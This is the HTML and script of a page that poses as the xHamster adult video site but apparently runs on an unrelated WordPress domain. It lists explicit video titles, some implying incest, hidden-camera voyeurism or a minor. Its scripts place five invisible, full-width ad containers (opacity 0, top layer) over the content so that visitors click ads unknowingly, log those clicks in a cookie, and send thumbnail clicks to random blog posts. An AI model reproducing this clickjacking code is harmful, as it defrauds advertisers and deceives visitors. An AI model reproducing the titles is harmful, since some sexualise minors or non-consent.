                                <img class="thumb-image js_lazy entered loaded" data-id="6" id="randomimage6" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/6.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh6/400/225';" alt="Video 6" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">19:33</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Desi Bhabhi Romance and Passionate Lovemaking While Husband Is Away</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">DesiFlix <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>540K</span>
                                        <span class="xh-rating">98%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 7 -->
                        <div class="xh-card js_video-box" data-id="7">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="7" id="randomimage7" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/7.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh7/400/225';" alt="Video 7" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">27:40</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Stepsis Please Don't Tell Mom What Happened In The Bathroom</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">SisLovesMe <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>1.5M</span>
                                        <span class="xh-rating">97%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 8 -->
                        <div class="xh-card js_video-box" data-id="8">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="8" id="randomimage8" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/8.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh8/400/225';" alt="Video 8" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">12:15</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Step Sister Accidentally Left The Door Open While Taking A Bath</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">FamilyTherapy <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>920K</span>
                                        <span class="xh-rating">99%</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <center id="jyad-2-in"></center>
                    <div id="textcontent-div-2" style="text-align:center;"></div>

                    <!-- 4-Column Grid: Section 2 (Cards 9-16) -->
                    <div class="xh-video-grid">
                        <!-- Card 9 -->
                        <div class="xh-card js_video-box" data-id="9">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="9" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/10.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh9/400/225';" alt="Video 9" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">20:50</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Horny Russian teen gets intense massage and happy ending from master</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">MassageRooms <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>310K</span><span class="xh-rating">96%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 10 -->
                        <div class="xh-card js_video-box" data-id="10">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="10" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/11.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh10/400/225';" alt="Video 10" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">16:22</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Japanese Cute College Girl Secret Orgasm Caught On Hidden Camera</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">TokyoHot <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>870K</span><span class="xh-rating">98%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 11 -->
                        <div class="xh-card js_video-box" data-id="11">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="11" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/12.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh11/400/225';" alt="Video 11" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">28:14</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Amateur Blonde College Party Turns Into Wild Group Bang Session</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">PartyHard <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>1.1M</span><span class="xh-rating">97%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 12 -->
                        <div class="xh-card js_video-box" data-id="12">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="12" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/13.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh12/400/225';" alt="Video 12" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">23:05</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Latina Maid Caught Naked Cleaning The Living Room - Punished Rough</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">LatinaAbuse <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>940K</span><span class="xh-rating">95%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 13 -->
                        <div class="xh-card js_video-box" data-id="13">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="13" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/14.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh13/400/225';" alt="Video 13" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">17:49</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Best Friend's Hot Mom Teaches Young Teen Boy Real Pleasures</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">MilfHunter <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>760K</span><span class="xh-rating">99%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 14 -->
                        <div class="xh-card js_video-box" data-id="14">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="14" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/2.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh14/400/225';" alt="Video 14" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">34:11</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Big Ass Latina Bounced Nonstop In Multiple Positions Until Creampie</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">Brazzers <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>2.4M</span><span class="xh-rating">98%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 15 -->
                        <div class="xh-card js_video-box" data-id="15">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="15" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/3.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh15/400/225';" alt="Video 15" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">19:55</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Asian Flight Attendant Satisfies VIP Passenger In First Class Suite</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">AsianStreet <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>520K</span><span class="xh-rating">96%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 16 -->
                        <div class="xh-card js_video-box" data-id="16">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="16" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/9.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh16/400/225';" alt="Video 16" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">21:08</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title" id="randomtitle5">Horny Stepsis Takes Massive Load After Intense Bedroom Session</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">FakeHub <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>1.8M</span><span class="xh-rating">97%</span></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <center id="jyad-3-in"></center>
                    <div id="textcontent-div-3" style="text-align:center;"></div>

                    <!-- SHORTS / MOMENTS SECTION -->
                    <div class="xh-shorts-section">
                        <div class="xh-shorts-header">
                            <div class="xh-shorts-title">
                                <span>⭐ NEW XHAMSTER SHORTS VIDEOS</span>
                                <span class="xh-shorts-badge">NEW</span>
                            </div>
                        </div>
                        <div class="xh-shorts-grid">
                            <!-- Short 1 -->
                            <div class="xh-short-card js_video-box" data-id="17">
                                <img class="thumb-image js_lazy entered loaded" data-id="17" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/1.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh1/225/400';" alt="Short 1" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">When he comes home early and catches you</span>
                                    <span class="xh-short-creator">@sweet_eva</span>
                                </div>
                            </div>
                            <!-- Short 2 -->
                            <div class="xh-short-card js_video-box" data-id="18">
                                <img class="thumb-image js_lazy entered loaded" data-id="18" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/4.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh2/225/400';" alt="Short 2" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">Do you like my new yoga pants try on?</span>
                                    <span class="xh-short-creator">@fit_babe</span>
                                </div>
                            </div>
                            <!-- Short 3 -->
                            <div class="xh-short-card js_video-box" data-id="19">
                                <img class="thumb-image js_lazy entered loaded" data-id="19" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/6.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh3/225/400';" alt="Short 3" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">Desi Bhabhi sensual saree moments</span>
                                    <span class="xh-short-creator">@desi_priya</span>
                                </div>
                            </div>
                            <!-- Short 4 -->
                            <div class="xh-short-card js_video-box" data-id="20">
                                <img class="thumb-image js_lazy entered loaded" data-id="20" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/8.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh4/225/400';" alt="Short 4" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">Can I stay over at your place tonight?</span>
                                    <span class="xh-short-creator">@bella_rose</span>
                                </div>
                            </div>
                            <!-- Short 5 -->
                            <div class="xh-short-card js_video-box" data-id="21">
                                <img class="thumb-image js_lazy entered loaded" data-id="21" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/10.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh5/225/400';" alt="Short 5" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">Teasing in the college locker room</span>
                                    <span class="xh-short-creator">@chloe_teen</span>
                                </div>
                            </div>
                            <!-- Short 6 -->
                            <div class="xh-short-card js_video-box" data-id="22">
                                <img class="thumb-image js_lazy entered loaded" data-id="22" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/15.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/sh6/225/400';" alt="Short 6" loading="lazy"/>
                                <div class="xh-short-overlay">
                                    <span class="xh-short-title">Morning stretch turns naughty</span>
                                    <span class="xh-short-creator">@amber_lust</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div id="textcontent-div-4" style="text-align:center;"></div>

                    <!-- 4-Column Grid: Section 3 (Cards 23-30) -->
                    <div class="xh-video-grid">
                        <!-- Card 23 -->
                        <div class="xh-card js_video-box" data-id="23">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="23" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/1.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh23/400/225';" alt="Video 23" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">25:12</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Busty Step Mommy Helps Stepson Sleep With Deep Throat Blowjob</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">MomsLickBoys <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>1.6M</span><span class="xh-rating">98%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 24 -->
                        <div class="xh-card js_video-box" data-id="24">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="24" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/2.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh24/400/225';" alt="Video 24" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">30:08</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Horny Russian College Slut Swallows Massive Cumshot On Couch</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">TeenMegaWorld <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>810K</span><span class="xh-rating">96%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 25 -->
                        <div class="xh-card js_video-box" data-id="25">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="25" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/3.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh25/400/225';" alt="Video 25" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">18:40</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Real Indian Village Bhabhi Romance In Farm House With Lover</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">DesiVillage <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>990K</span><span class="xh-rating">99%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 26 -->
                        <div class="xh-card js_video-box" data-id="26">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="26" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/4.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh26/400/225';" alt="Video 26" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">22:30</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Petite Japanese Student Begs Older Boss For Deep Hard Thrusts</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">S1No1 <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>670K</span><span class="xh-rating">97%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 27 -->
                        <div class="xh-card js_video-box" data-id="27">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="27" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/5.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh27/400/225';" alt="Video 27" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">15:10</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Gym Instructor Helps Hot Fit Babe Stretch And Ends Up Pounding Her</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">FitnessLovers <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>1.3M</span><span class="xh-rating">95%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 28 -->
                        <div class="xh-card js_video-box" data-id="28">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="28" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/6.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh28/400/225';" alt="Video 28" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">28:50</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Stepbrother Sneaks Into Room At Midnight For Forbidden Desires</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">BrotherCrush <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>2.1M</span><span class="xh-rating">98%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 29 -->
                        <div class="xh-card js_video-box" data-id="29">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="29" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/7.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh29/400/225';" alt="Video 29" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">19:40</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Thick Curvy Ebony Babe Squirts Hard On Couch From BBC Pounding</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">Blacked <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>1.7M</span><span class="xh-rating">99%</span></div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 30 -->
                        <div class="xh-card js_video-box" data-id="30">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="30" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/8.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh30/400/225';" alt="Video 30" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">24:15</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Czech Casting Agent Convinces Shy Innocent Girl To Strip Down Completely</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">CzechCasting <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats"><span>3.2M</span><span class="xh-rating">99%</span></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div id="textcontent-div-5" style="text-align:center;"></div>

                    <!-- Pagination -->
                    <div class="xh-pagination">
                        <button class="xh-page-btn active">1</button>
                        <button class="xh-page-btn">2</button>
                        <button class="xh-page-btn">3</button>
                        <button class="xh-page-btn">4</button>
                        <button class="xh-page-btn">5</button>
                        <span class="xh-page-dots">...</span>
                        <button class="xh-page-btn">1248</button>
                        <button class="xh-page-btn" style="background:#d2232a; color:#fff; border-color:#d2232a;">Next &gt;</button>
                    </div>

                    <center id="jyad-4-in"></center>
                    <div id="textcontent-div-6" style="text-align:center;"></div>
                </main>
            </div>

            <!-- Footer -->
            <footer class="xh-footer">
                <div class="xh-footer-grid">
                    <div class="xh-footer-col">
                        <h4>xHamster</h4>
                        <ul>
                            <li><a href="javascript:void(0);">About xHamster</a></li>
                            <li><a href="javascript:void(0);">Official Blog</a></li>
                            <li><a href="javascript:void(0);">FAQ &amp; Support</a></li>
                            <li><a href="javascript:void(0);">Webmasters Program</a></li>
                            <li><a href="javascript:void(0);">Advertise With Us</a></li>
                        </ul>
                    </div>
                    <div class="xh-footer-col">
                        <h4>Help &amp; Info</h4>
                        <ul>
                            <li><a href="javascript:void(0);">Contact Support</a></li>
                            <li><a href="javascript:void(0);">Content Removal (DMCA)</a></li>
                            <li><a href="javascript:void(0);">Report Security Issue</a></li>
                            <li><a href="javascript:void(0);">Opt Out &amp; Disable Ads</a></li>
                            <li><a href="javascript:void(0);">Mobile &amp; VR Apps</a></li>
                        </ul>
                    </div>
                    <div class="xh-footer-col">
                        <h4>Legal &amp; Compliance</h4>
                        <ul>
                            <li><a href="javascript:void(0);">Terms of Service</a></li>
                            <li><a href="javascript:void(0);">Privacy Policy</a></li>
                            <li><a href="javascript:void(0);">DMCA Notice</a></li>
                            <li><a href="javascript:void(0);">18 U.S.C. 2257 Record-Keeping</a></li>
                            <li><a href="javascript:void(0);">Parental Control (RTA)</a></li>
                        </ul>
                    </div>
                    <div class="xh-footer-col">
                        <h4>Earn &amp; Monetize</h4>
                        <ul>
                            <li><a href="javascript:void(0);">Creator Studio</a></li>
                            <li><a href="javascript:void(0);">Model Program</a></li>
                            <li><a href="javascript:void(0);">Affiliate Network</a></li>
                            <li><a href="javascript:void(0);">Live Cam Partner</a></li>
                        </ul>
                    </div>
                </div>

                <div class="xh-footer-bottom">
                    <span class="xh-badge-18">18+ ADULTS ONLY</span>
                    <p>xHamster &copy; 2026 - All Rights Reserved. All models appearing on this website are 18 years or older.</p>
                </div>
            </footer>

            <!-- Floating Ad Units Container -->
            <div id="floatads1" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:9999;opacity:0;top:290px!important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-1"></center>
                </div>
            </div>
            <div id="floatads2" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:9999;opacity:0;top:290px!important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-2"></center>
                </div>
            </div>
            <div id="floatads3" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:9999;opacity:0;top:580px !important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-3"></center>
                </div>
            </div>
            <div id="floatads4" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:9999;opacity:0;top:870px !important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-4"></center>
                </div>
            </div>
            <div id="floatads5" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:9999;opacity:0;top:1160px !important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-5"></center>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts Section -->
    <script>
        function getWpApiEndpoint() {
            try {
                const restLink = document.querySelector('link[rel="https://api.w.org/"]') ||
                                 document.querySelector('link[rel="alternate"][type="application/json"][href*="/wp-json"]');
                if (restLink && restLink.href) {
                    var h = restLink.href;
                    return h.endsWith('/') ? h.slice(0, -1) : h;
                }
                if (window.wpApiSettings && window.wpApiSettings.root) {
                    var r = window.wpApiSettings.root;
                    return r.endsWith('/') ? r.slice(0, -1) : r;
                }
                const cachedApi = sessionStorage.getItem("wp_api_endpoint");
                if (cachedApi) return cachedApi;
            } catch (e) {}
            return \`\${window.location.origin}/wp-json\`;
        }

        let wpPosts = (window.__wp_posts && window.__wp_posts.length > 0)
            ? window.__wp_posts
            : (() => {
                try {
                    const cached = sessionStorage.getItem("wp_posts_cache");
                    if (cached) {
                        const parsed = JSON.parse(cached);
                        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
                    }
                } catch (e) {}
                return [];
            })();

        async function fetchWpPosts() {
            if (wpPosts && wpPosts.length > 0) return wpPosts;
            const apiEndpoint = getWpApiEndpoint();
            let posts = [];
            try {
                let res = await fetch(\`\${apiEndpoint}/wp/v2/posts?per_page=50&_fields=link\`, { cache: "no-store" });
                if (!res.ok) res = await fetch(\`\${apiEndpoint}/wp/v2/posts?per_page=10&_fields=link\`, { cache: "no-store" });
                if (res.ok) {
                    const data = await res.json();
                    if (Array.isArray(data) && data.length > 0) {
                        posts = data.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\\/\\//i.test(u.trim()));
                    }
                }
            } catch (err) {}
            if (!posts || posts.length === 0) posts = [\`\${window.location.origin}/\`];
            wpPosts = posts;
            window.__wp_posts = posts;
            try { sessionStorage.setItem("wp_posts_cache", JSON.stringify(posts)); } catch (e) {}
            return posts;
        }

        function getRandomTargetUrl() {
            let pool = (wpPosts && wpPosts.length > 0) ? wpPosts : (window.__wp_posts || []);
            if (!pool || pool.length === 0) {
                try {
                    const cached = sessionStorage.getItem("wp_posts_cache");
                    if (cached) pool = JSON.parse(cached);
                } catch (e) {}
            }
            if (Array.isArray(pool) && pool.length > 0) {
                const current = window.location.href.split('?')[0];
                const cleanCurrent = current.endsWith('/') ? current.slice(0, -1) : current;
                const filtered = pool.filter(u => {
                    if (typeof u !== 'string') return false;
                    const cleanU = u.split('?')[0].endsWith('/') ? u.split('?')[0].slice(0, -1) : u.split('?')[0];
                    return cleanU !== cleanCurrent;
                });
                const finalPool = filtered.length > 0 ? filtered : pool;
                return finalPool[Math.floor(Math.random() * finalPool.length)];
            }
            return window.location.origin + '/';
        }

        const allowed_jye_adtype = ['adsense', 'gpt', 'both'];
        let jye_adtype = 'gpt';
        let divIds = ['jyad-1', 'jyad-2', 'jyad-3', 'jyad-4', 'jyad-5'];
        let divIdsIn = ['jyad-1-in', 'jyad-2-in', 'jyad-3-in', 'jyad-4-in', 'jyad-5-in'];
        let adSenseClientId = "3629083474762645";
        let adSenseSlots = ['2414446359', '8769542736', '2127714705', '8103700771', '5334539961'];
        let gptUnits = [{
             path: '/23332666651/adx1',
             sizes: [
                 [300, 250],
                 [320, 480],
                 [336, 280],
                 [480, 320]
             ]
         }, {
             path: '/23332666651/adx2',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }, {
             path: '/23332666651/adx3',
             sizes: [
                 [336, 280],
                 [300, 250],
                 [320, 480],
                 [480, 320]
             ]
         }, {
             path: '/23332666651/adx4',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }, {
             path: '/23332666651/adx5',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }];
    </script>
    <script>
        const targetv = document.getElementById("playWrapper");
        const floatads1 = document.getElementById("floatads1");
        const target = document.getElementById("relatedVideos1234");
        const floatads2 = document.getElementById("floatads2");
        const floatads3 = document.getElementById("floatads3");
        const floatads4 = document.getElementById("floatads4");
        const floatads5 = document.getElementById("floatads5");
        window.addEventListener("scroll", () => {
            const rectv = targetv ? targetv.getBoundingClientRect() : { top: 0 };
            const rect = target ? target.getBoundingClientRect() : { top: 0 };
            var newTop = rectv.top;
            if (floatads1) floatads1.style.setProperty("top", newTop + "px", "important");
            var newTop2 = rect.top + 290;
            if (floatads2) floatads2.style.setProperty("top", newTop2 + "px", "important");
            if (floatads3) floatads3.style.setProperty("top", newTop2 + "px", "important");
            if (floatads4) floatads4.style.setProperty("top", newTop2 + "px", "important");
            if (floatads5) floatads5.style.setProperty("top", newTop2 + "px", "important");
        });
    </script>
    <script>
        const textArray = [
            "Watch free trending adult videos, full length movies, and top rated clips in HD quality.",
            "Thousands of new scenes added every hour from top amateur and verified premium channels.",
            "Stream fast and buffer-free on mobile phones, tablets, smart TVs, and desktop computers.",
            "Explore exclusive categories including amateur, teen 18+, milf, Japanese, Indian bhabhi, and hardcore.",
            "Enjoy the hottest moments and short clips from your favorite creators updated continuously.",
            "Free registration gives you access to subscribe to top creators and save favorites."
        ];

        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        for (let i = 1; i <= 6; i++) {
            const textcontentdiv = document.getElementById(\`textcontent-div-\${i}\`);
            if (!textcontentdiv) continue;
            const randomText = textArray[Math.floor(Math.random() * textArray.length)];
            textcontentdiv.textContent = randomText;
            const randomHeight = getRandomInt(35, 75);
            textcontentdiv.style.minHeight = randomHeight + "px";
            textcontentdiv.style.color = "#666";
            textcontentdiv.style.fontSize = "12px";
        }
    </script>
    <script>
        function setCookie(name, value, hours) {
            let expires = "";
            if (hours) {
                const date = new Date();
                date.setTime(date.getTime() + (hours * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                let c = cookies[i].trim();
                if (c.indexOf(nameEQ) === 0) {
                    return decodeURIComponent(c.substring(nameEQ.length));
                }
            }
            return null;
        }

        function isCookieExists(name) {
            return getCookie(name) !== null;
        }

        function adclicked() {
            if (document.hasFocus()) {
                sessionStorage.setItem("adclk", 1);
                setCookie("wdchange", "true", 19);
            }
        }

        // Hook all thumbnail image cards with .thumb-image to trigger random WordPress permalink redirection
        const thumbs = document.querySelectorAll('.thumb-image');
        thumbs.forEach(img => {
            img.addEventListener('click', function() {
                var click_id = this.getAttribute('data-id');
                setCookie("jpid", click_id, 9);
                var randomblgurl = getRandomTargetUrl();
                if (randomblgurl) {
                    window.location.href = randomblgurl;
                }
            });
        });
    </script>
